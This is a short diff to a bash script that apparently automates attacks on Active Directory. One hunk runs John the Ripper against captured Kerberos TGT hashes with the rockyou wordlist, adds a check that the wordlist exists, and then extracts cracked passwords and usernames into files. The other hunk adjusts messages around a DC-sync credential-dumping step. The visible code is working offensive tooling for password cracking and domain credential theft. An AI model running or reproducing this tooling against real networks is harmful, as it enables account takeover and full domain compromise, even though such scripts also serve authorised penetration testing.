@@ -250,12 +250,18 @@ then
                     fi
                 fi
             else
-            john --wordlist=/usr/share/wordlists/rockyou.txt tgt.hash > pass.txt 
-            cat pass.txt | grep "\$k" > tgtpassords.txt
-            cat tgtpassords.txt | sort -u > tgtpasswords.txt
-            rm tgt pass.txt tgtpassords.txt
-            cat tgtpasswords.txt | cut -d " " -f 1 > passwordmon.txt
-            cat tgtpasswords.txt | cut -d "$" -f 4 | cut -d "@" -f 1 > usermon.txt
+                word=/usr/share/wordlists/rockyou.txt
+                if [[(`ls -1 $word 2>/dev/null | wc -l ` -gt 0 )]]
+                    then
+                    john --wordlist=$word tgt.hash > pass.txt 
+                    cat pass.txt | grep "\$k" > tgtpassords.txt
+                    cat tgtpassords.txt | sort -u > tgtpasswords.txt
+                    rm tgt pass.txt tgtpassords.txt
+                    cat tgtpasswords.txt | cut -d " " -f 1 > passwordmon.txt
+                    cat tgtpasswords.txt | cut -d "$" -f 4 | cut -d "@" -f 1 > usermon.txt
+                    else
+                    echo -e "\n${BOLDRED}rockyou not Found${END}"
+                fi
             fi
 
         if [[($(wc -l < passwordmon.txt) -le 1 && $(wc -l < usermon.txt) -le 1)]]
@@ -387,7 +393,8 @@ then
                     fi
                     if [[(`ls -1 *.secretDump 2>/dev/null | wc -l ` -gt 0 )]]
                     then
-                    echo -e "${BOLDRED}Bye!\n0xDIGIMON${END}"
+                    #echo -e "${BOLDRED}Bye!\n0xDIGIMON${END}"
+                    echo
                     else
                     echo -e "${BOLDRED}Feild dc-sync Attack${END}"
                     echo -e "${BOLDRED}Bye!\n0xDIGIMON${END}"
